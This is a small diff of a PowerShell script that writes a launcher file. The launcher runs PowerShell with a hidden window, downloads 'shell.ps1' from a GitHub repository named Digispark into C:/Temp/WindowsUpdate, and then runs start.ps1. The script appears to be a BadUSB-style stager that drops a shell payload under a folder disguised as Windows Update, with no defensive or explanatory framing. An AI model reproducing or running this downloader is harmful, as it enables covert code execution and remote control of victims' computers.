@@ -4,4 +4,4 @@ $file = New-Item -Path $dir -ItemType "file"
 
 "powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/izaelbm/Digispark/main/shell.ps1','C:/Temp/WindowsUpdate/shell.ps1')" > $file
 
-powershell.exe C:/Temp/WindowsUpdate/start.ps1
+"powershell.exe C:/Temp/WindowsUpdate/start.ps1" >> $file
